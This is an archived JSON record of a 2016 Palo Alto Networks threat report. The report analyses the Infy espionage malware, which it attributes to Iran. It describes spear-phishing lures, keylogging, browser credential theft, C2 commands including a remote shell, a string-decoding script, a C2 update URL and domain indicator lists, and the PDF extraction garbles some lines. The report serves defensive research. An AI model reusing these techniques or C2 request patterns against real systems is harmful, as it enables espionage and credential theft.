{
    "id": "a7aecabb-b71d-479b-ba82-256a2f88cbd2",
    "created_at": "2022-10-25T16:48:12.932196Z",
    "updated_at": "2025-03-27T02:11:55.116067Z",
    "deleted_at": null,
    "sha1_hash": "bd91ba55a44f3288be1483e8d160e2910e1eed21",
    "title": "Prince of Persia: Infy Malware Active In Decade of Targeted Attacks",
    "authors": "Palo Alto",
    "file_creation_date": "2016-06-11T00:15:28Z",
    "file_modification_date": "0001-01-01T00:00:00Z",
    "file_size": 368437,
    "plain_text": "# ce o e s a y a a e c e ecade o a ge ed Attacks\n\n**[researchcenter.paloaltonetworks.com /2016/05/prince-of-persia-infy-malware-active-in-decade-of-targeted-](http://researchcenter.paloaltonetworks.com/2016/05/prince-of-persia-infy-malware-active-in-decade-of-targeted-attacks/)**\nattacks/\n\nAttack campaigns that have very limited scope often remain hidden for years. If only a few malware samples are\ndeployed, it’s less likely that security industry researchers will identify and connect them together.\n\nIn May 2015, Palo Alto Networks WildFire detected two e-mails carrying malicious documents from a genuine and\ncompromised Israeli Gmail account, sent to an Israeli industrial organization. One e-mail carried a Microsoft\n[PowerPoint file named “thanks.pps” (VirusTotal), the other a Microsoft Word document named “request.docx”.](https://www.virustotal.com/en/file/a1d5ab7125f002262151e516151e9b9223b3f5ca3863d69dd8a12b066c162906/analysis/)\n\nAround the same time, WildFire also captured an e-mail containing a Word document (“hello.docx”) with an identical\nhash as the earlier Word document, this time sent to a U.S. Government recipient.\n\nBased on various attributes of these files and the functionality of the malware they install, we have identified and\ncollected over 40 variants of a previously unpublished malware family we call Infy, which has been involved in\nattacks stretching back to 2007. Attacks using this tool were still active as of April 2016.\n\n## Attack Technique\n\nThe attacks we have identified carrying Infy begin with a spear-phishing e-mail carrying a Word or PowerPoint\ndocument. The attached document file contains a multi-layer Self-Extracting Executable Archive (SFX), and content\nattempting to social engineer the recipient into activating the executable. In this example, the PPS file, when clicked,\nopens in “PowerPoint Show” mode. The user sees a PowerPoint page (Figure 1) that mimics a paused movie, and\nis tricked into clicking “Run” (Figure 2), which allows the embedded SFX file to execute.\n\n_Figure 1 PowerPoint page mimics a paused video_\n\n\n-----\n\n_Figure 2 User tricked into running embedded SFX EXE_\n\nOne of the SFX layers is encrypted with the key “1qaz2wsx3edc”. The package (Figure 3) typically includes a fake\nreadme.txt file as camouflage (for example, impersonating an Aptana Studio application), and in some campaigns,\nimage or video files (Figure 4). The executable typically has a filename pattern ins[*].exe where * are random digits\nof up to 4 characters. The main payload is a DLL file with a typical filename pattern mpro[*].dll where * are random\ndigits of up to 3 characters (early versions used a .cpl extension).\n\n_Figure 3 Embedded SFX contents_\n\n_Figure 4 Some campaigns include image or video files as camouflage_\n\nThe executable installs the DLL, writes to the autorun registry key, and doesn’t activate until a\nreboot. After reboot, it first checks for antivirus and then connects to the C2. It starts collecting\nenvironment data, initiates a keylogger, and steals browser passwords and content such as\ncookies, before exfiltrating the stolen data to the C2 server.\n\nThe initially-observed “thanks.pps” example tricks the user into running the embedded file\nnamed ins8376.exe which loads a payload DLL named mpro324.dll.\n\n## Infrastructure\n\n\n-----\n\nOther campaigns use a combination of Dynamic DNS providers, third-party site hosting services, and apparently\nfirst-party-registered domains as C2 servers.\n\nAnalysis of hosting and WHOIS data (Figure 5) led to a total of 12 related first-party-registered domains used for C2\nservers:\n\nbestbox3[.]com\n\nmyblog2000[.]com\n\nsafehostonline[.]com\n\nupdateserver3[.]com\n\nshort-name[.]com\n\nbestupdateserver2[.]com\n\nbestwebstat[.]com\n\nupdatebox4[.]com\n\nbestupdateserver[.]com\n\nshort-url20[.]com\n\nupdateserver1[.]com\n\nbox4054[.]net\n\nAges of these domains suggest that some may have been used for malicious activity back as far as early 2010.\n\n[We found a report by the Danish Defense Intelligence Service’s Center for Cybersecurity](https://fe-ddis.dk/cfcs/CFCSDocuments/Phishing uden fangst.pdf), which had observed\nsimilar attacks against Danish Government targets, and documented a small portion of the same C2 infrastructure.\n\n\n-----\n\n_Figure 5 Infrastructure and Actor information related to Infy Attacks_\n\nWe initially found a file with an identical hash as the originally-observed PowerPoint file, but a different filename\n(“syria.pps”), uploaded to VirusTotal (Figure 6) also in May of 2015. A characteristic observed across these\ncampaigns is that the actor puts deliberate effort into the specific geographic targeting, with region-specific attack\ncontent.\n\n\n-----\n\n_Figure 6 Powerpoint file uploaded to VirusTotal with a different file name_\n\nWe were subsequently able to pivot and associate additional malware and campaigns based on infrastructure,\nhashes, strings, and payload links and similarities. The most conclusive evidence that all of these are linked is found\nin a single key, used to encode strings within the malware across all examples. Only the offset varies: older versions\nencode just the C2 data, newer versions encode most strings, and some double-encode the C2 data with two\ndifferent offsets. The following script can be used to decode these strings:\n\n\n1\n\n2\n\n3\n\n4\n\n5\n\n6\n\n7\n\n8\n\n9\n\n10\n\n11\n\n12\n\n13\n\n14\n\n15\n\n16\n\n\nimport string\n\nimport base64\n\nFIRST_PHASE =\n\n\"OQTJEqtsK0AUB9YXMwr8idozF7VWRPpnhNCHI6Dlkaubyxf5423jvcZ1LSGmge\"\n\nSECOND_PHASE = \"\" +\n\n\"PqOwI1eUrYtT2yR3p4E5o6WiQu7ASlDkFj8GhHaJ9sKdLfMgNzBx0ZcXvCmVnb“\n\ndef decrypt(input, offset=-10):\n\nresult = \"\"\n\nfor i, c in enumerate(input):\n\ni = i % 62 + 1\n\ntry:\n\nindex = FIRST_PHASE.index(c)\n\nexcept ValueError:\n\nresult += c\n\ncontinue\n\ntranslated = SECOND_PHASE[(index - i + offset) % len(SECOND_PHASE)]\n\nresult += translated\n\nreturn result\n\n\n-----\n\n2007 (Figure 7), although more frequent related activity is observed after 2011. Historic registration of the C2\ndomain associated with the oldest sample that we found, fastupdate[.]net, suggests that it may have been\nassociated with malicious activity as far back as December 2004.\n\nOver the years, we notice continued development and feature improvement in the code. For instance, support for\nthe new Microsoft Edge browser was recently introduced in “version 30”.\n\n_Figure 7 Oldest related example found dates to 2007_\n\nMost of the associated malware samples dating back over the last five years were eventually detected by antivirus\nprograms, but in most cases with a generic signature. Other examples are named with multiple unrelated signature\nclassifications, including Win32/Tuax.A (very old versions), W32/ADOKOOB, Win32/Cloptern.A & B (old versions),\nTR/Graftor.106254, TR/Spy.Arpnatis.A, and Win32/Skeeyah.A!bit.\n\nWe refer to the malware as “Infy” because the actor used this string in multiple locations, including filenames\n(“infy74f1.exe” – Infy version 7.4 F1), C2 strings (“subject=INFY M 7.8”), and C2 folder names.\n\n## Attribution\n\nThe Gmail account sending the emails in the attack that we first observed (Figure 8), belongs to an Israeli victim.\nThat account was itself victim of an e-mail-borne attack that compromised the user’s system and e-mail account.\n\n_Figure 8 First-observed attack, via email_\n\nAmong WHOIS records for first-party domains used in the C2 infrastructure, we find three email accounts bearing a\nstrong similarity in naming pattern:\n\n\n-----\n\ncontent. The “aminjalali_58 (at) yahoo.com” email address is associated with 6 known C2 domains, dating back to\n2010. Unlike the fake WHOIS examples, this example has content more consistent with the email address:\n\n_amin jalali_\n_safehostonline_\n_afriqa street number 68_\n_tehran_\n_Tehran_\n_19699_\n_IR_\n_+98.935354252_\n_aminjalali_58 (at) yahoo.com_\n\nThe name “Amin Jalali” is not unique, though it does appear to have Iranian-specific origins. We find profiles and\nartifacts combining the name and “58”, which may (or may not) be the same individual, and all of which have Iranian\nlinks.\n\nWhen we look at domains on neighboring IP addresses from known first-party C2s, we observe numerous Iranian\ndomains, suggesting possibly an Iranian hosting reseller – and in at least one case, a free Iranian web host (Figure\n9).\n\n_Figure 9 Neighbor IP addresses with Iranian domains_\n\n## Conclusion\n\nWe have enough evidence to conclude a pattern of behavior following extensive analysis of this malware and C2\ninfrastructure between these samples. The activity has been observed over almost 10 years, with the malware being\nconstantly improved and developed. The low-volume of activity, deliberate campaign focus and content tailoring, and\nnature of targets hints at the goals of this actor.\n\nWe believe that we have uncovered a decade-long operation that has successfully stayed under the radar for most\nof its existence as targeted espionage originating from Iran. It is aimed at governments and businesses of multiple\nnations as well as its own citizens.\n\nPalo Alto Networks customers are protected from this threat in the following ways:\n\n1 WildFire accurately identifies all malware samples related to this operation as malicious\n\n\n-----\n\n3. AutoFocus users can view malware related to this attack using the “Infy tag.\n\nIOCs can be found in the appendices of this report.\n\nSpecial thanks to Michael Scott for assistance with Maltego in this investigation.\n\n## Appendix 1 – Detailed Infy Malware Analysis\n\nAlthough Infy is fundamentally one malware family, we observe two distinct variants. The regular variant “Infy” is\nversioned by the malware author 1-30 (1999 -15999 sub-versions). In addition, we observe a distinct variant “Infy M”\ndeveloped in parallel with the regular variant since about 2013. Infy M appears to be a full featured variant, deployed\nagainst high-value targets. It includes more functionality: while the original variant has no remote control, “M” adds\nthe ability for the C2 to issue commands to the malware via C2 PHP scripts; HTTP support; a hidden GUI control\npanel; and FTP client.\n\n## Infy\n\nDetailed analysis of a recent Infy sample (version 30, active from 24 February 2016):\n\nThe initial executable first checks for installed antivirus programs. It uses the Windows API function\n“GetFileattributeA” on a list of several common AV installation directories, testing any positive return with\n“file_attribute_directory”. Depending on which AV Infy finds, it will either abort, or install the malicious Infy DLL using\na different technique. This concern with avoiding client-AV detection, skipping installation rather than risk alerting, is\nsomewhat noteworthy (as opposed to the relatively common sandbox-detection techniques). The EXE installs the\nDLL, writes to the autorun key, and does nothing else until restart.\n\nUpon restart, the EXE loader executes the main function, exported by the DLL malware file DLL (previously we\nobserved functions named “start1/start2/start3”) with the parameter /rcv (this version uses a decryption offset of 19).\nIt installs itself in “cyberlink” directory.\n\nIt will then search for files with “bak”, “csv”, or “cnt”, extensions. If the parameter “/rcv” was used, it starts a\nkeylogger (the keylogger uses a window name “TRON2VDLLB” (GetMessageA/translate\nmessage/DispatchMessageA). It next registers hotkeys, and gets clipboard data. Get_browser_data steals\npasswords, forms, cookies, history (from Microsoft Edge, Internet Explorer, Google Chrome, Opera, and Firefox).\n\nThe malware connects to the C2 every five minutes using HTTP, posting:\n\n<computer name>\n<user name>\ndn = n1\nver = 30\nlfolder= f\ncpuid=\nmachineguid (from hklm\\SOFTWARE\\Microsoft\\Cryptography\\machineguid)\ntt= time\n\nAfter posting data about the infected system to the C2 server, the malware downloaded an update named\n“v30nXf1.tmp” file to %temp%\\drvtem64.tmp. If the download is successful, the malware writes “OK, Downloaded\n\n[url file]” to log file. It then connects again, with a similar posting format, but this time also adding “tt=” (time) and\n“cp id ” It installs the do nloaded file ith parameter “ sp/ins pBA5a88E” A third connection adds “sfolder”\n\n\n-----\n\nEach variant of Infy uses specific “cover” camouflage to with file metadata that makes it appear as though it is\nlegitimate software. In this case, the file used the software name “Cyberlink,” and a description of “CLMediaLibrary\nDynamic Link Library” and listing version 4.19.9.98.\n\n## Infy M\n\nWe observed the Infy M variant with versions 6.1 through 7.8, adding features including screen capture, document\ncapture & upload, and microphone capture. Infy M supports the following C2 commands:\n\nASIDLE – idle\nASDIR – directory list of files\nASPUT – download file\nASGET – upload file\nASZIPGET – upload as zip\nASDELETE – delete file\nASRENAME – rename file\nASRUN – execute file\nASENDTASK – terminate process\nASZIP – zip file\nASSHELL – remote shell\n\nThe “M” variant uses mostly distinct C2 servers from the regular Infy samples (although very recently, we also\nobserved version 7.8 using C2 “youripinfo.com”, previously seen as C2 for the regular variant):\n\nbestupdateserver[.]com – Observed 2013-12-09\nwww.bestupdateserver[.]com – Observed 2013-04-26\nbestbox3[.]com – Observed 2015-08-25\nwww.bestupdateserver2[.]com – Observed 2015-05-22\nbestupdateserver2[.]com – Observed 2014-07-16\n\n## Analysis of an early version of “M”, 6.2\n\nVersions 6.x of the Infy M variant camouflage themselves with file and window names set to Borland hcrtf. They use\na single EXE, rather than a loader EXE and payload DLL as seen in the original variant. The malware initially\nperforms a check to see if the victim as already infected by checking for window names “Borland hcrtf 6.x” or\n“Macromedia Swsoc 7.x”.\n\nWe have identified five hidden GUI control forms in Infy M, one of which is not used. The first form includes three\npossible parameters. Parameter “/ins” installs the Trojan. It first creates and starts the service and on Windows\nversions prior to Vista it requires the “/s” parameter. After installing itself, the malware deletes any previous Infy\ninstallations. The does this by terminating processes and deleting Infy files in %system32%, %appdata%,\n%appdata%\\hcrtf (for example, pre-6.1 files incsy32.exe, incs32.exe, ntvdn.exe, grep.exe, hcrtf.exe, grep.dll). It\nthen renames the ini file from grepc.ini to hcrtfc.ini. It completes clean-up by deleting the “inverse Ser32”, “grep”,\nand “hcrtf” services. Finally, it downloads and executes the update file from the C2 at /infy/update.php.\n\nThe /c (copy) parameter sets up autostart for the malware by writing to registry key “run” (Windows Vista and above)\nor “runservices” (versions prior to Windows Vista). The /s (service) parameter creates and starts the service\n(Windows Vista and later). At this point, the malware waits, and handles any commands issued over HTTP from the\n\n\n-----\n\n“ReadDirectoryChangesW”. It targets document file types .doc, .xls, .jpg, .jpe, .txt, .htm, .pgp, .pdf, .zip, and .rar and\nZIP compresses them (using the password “Z8(2000_2001uI”) into a file located at \\Program\nFiles\\Yahoo!\\Messenger\\Profiles\\yfsbg\\yfsbg\\3dksf.tmp.\n\nThe third form takes a screen captures and stores it the “yfsbg” folder as 4dksf.tmp. It the uploads the screenshot\nand document-capture files using POST (instead of using GET as seen in the regular variants) to <C2\nserver>/infy/fms.php.\n\nThe fourth form is not used. The fifth form is used for microphone capture.\n\nThe 7.x versions install themselves as swsoc.exe (7.4 also seen using infy74f1.exe) at <documents and settings>\\all\nusers\\application data\\macromedia\\8080\\swsoc.exe. They also create a subfolder “fsbg”, where they store the\ncopies of documents opened by the user. These are stored with their CRC value as their filename, RAR\ncompressed with the same password “Z8(2000_2001uI”.\n\nWe observed a server reply with error in the PHP, giving us some of their underlying file structure:\n\n<b>Warning</b>: Cannot modify header information – headers already sent by (output started at\n/home/bestupda/public_html/infy/fms.php:115) in <b>/home/bestupda/public_html/infy/fms.php</b> on line\n<b>116</b><br />\n\nUpgrade requests are observed with this syntax (here, version 6.2 to the latest version):\n\nhttp://www.bestupdateserver.com/infy/update.php?cn=<computername>&ver=6.2&u=27/3/2016 20:37:23\n\n## Appendix 2 – Observed Hashes\n\nA list of hashes for associated files observed in this operation can be found [here.](https://github.com/pan-unit42/iocs/blob/master/prince_of_persia/hashes.csv)\n\n## Appendix 3 – Observed Infy C2 Domains\n\nanalyse1[.]mooo[.]com\nbest[.]short-name[.]com\nbest2[.]short-name[.]com\nbest2[.]short-url20[.]com\nbest3[.]short-url20[.]com\nbest4[.]short-url20[.]com\nbest5[.]short-url20[.]com\nbest6[.]short-url20[.]com\nbest7[.]short-url20[.]com\nbestbox3[.]com\nbestupdateserver[.]com\nbestupdateserver2[.]com\nbestupser[.]awardspace[.]info\nbestwebstat[.]com\nbl2pe[.]bestwebstat[.]com\nbox4054[.]net\nc1[.]short-url20[.]com\ndbook[.]soon[.]it\ndsite[.]dyx[.]comextd[.]mine[.]bz\n\n\n-----\n\ngstat[.]strangled[.]net\nlost[.]updateserver1[.]com\nlu[.]ige[.]es\nmand[.]pwnz[.]org\nmyblog2000[.]com\nns2[.]myblog2000[.]com\nnus[.]soon[.]it\nsafehostonline[.]com\nsecup[.]soon[.]it\nshort-name[.]com\nshort-url20[.]com\nupdate[.]info[.]gf\nupdatebox4[.]com\nupdateserver1[.]com\nupdateserver3[.]com\nus1[.]short-name[.]com\nus12[.]short-url20[.]com\nus13[.]short-url20[.]com\nus15[.]short-url20[.]com\nus16[.]short-url20[.]com\nus1s2[.]strangled[.]net\nwep[.]archvisio[.]com\nwep[.]soon[.]it\nwpstat[.]mine[.]bz\nwpstat[.]strangled[.]net\nwww[.]fastupdate[.]net\nwww[.]updateserver1[.]com\nyouripinfo[.]com\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "d63ae2b7-445f-460d-965d-2676dacdb6de",
            "created_at": "2022-10-25T15:59:19.552139Z",
            "updated_at": "2022-10-25T15:59:19.552139Z",
            "deleted_at": null,
            "name": "APTnotes",
            "url": "https://github.com/aptnotes/data",
            "description": "APTnotes data",
            "reports": null
        }
    ],
    "references": [
        "https://app.box.com/s/zkjmru7uknf1p90mqn81ycf867le78tn"
    ],
    "report_names": [
        "PaloAlto_PrinceofPersiaInfyMalware(05-02-2016)"
    ],
    "threat_actors": [
        {
            "id": "59c9f31b-e032-44b9-bf3b-4f2cb3d17e39",
            "created_at": "2022-10-25T16:07:23.734244Z",
            "updated_at": "2025-03-27T02:02:09.952685Z",
            "deleted_at": null,
            "main_name": "Infy",
            "aliases": [
                "APT-C-07",
                "Infy",
                "Operation Mermaid",
                "Prince of Persia"
            ],
            "source_name": "ETDA:Infy",
            "tools": [
                "Foudre",
                "Infy",
                "Tonnerre"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "f763fd1f-f697-40eb-a082-df6fd3d13cb1",
            "created_at": "2023-01-06T13:46:38.561288Z",
            "updated_at": "2025-03-27T02:00:02.861874Z",
            "deleted_at": null,
            "main_name": "Infy",
            "aliases": [
                "Operation Mermaid",
                "Prince of Persia",
                "Foudre"
            ],
            "source_name": "MISPGALAXY:Infy",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        }
    ],
    "ts_created_at": 1666716492,
    "ts_updated_at": 1743041515,
    "ts_creation_date": 1465604128,
    "ts_modification_date": 0,
    "files": {
        "pdf": "https://archive.orkl.eu/bd91ba55a44f3288be1483e8d160e2910e1eed21.pdf",
        "text": "https://archive.orkl.eu/bd91ba55a44f3288be1483e8d160e2910e1eed21.txt",
        "img": "https://archive.orkl.eu/bd91ba55a44f3288be1483e8d160e2910e1eed21.jpg"
    }
}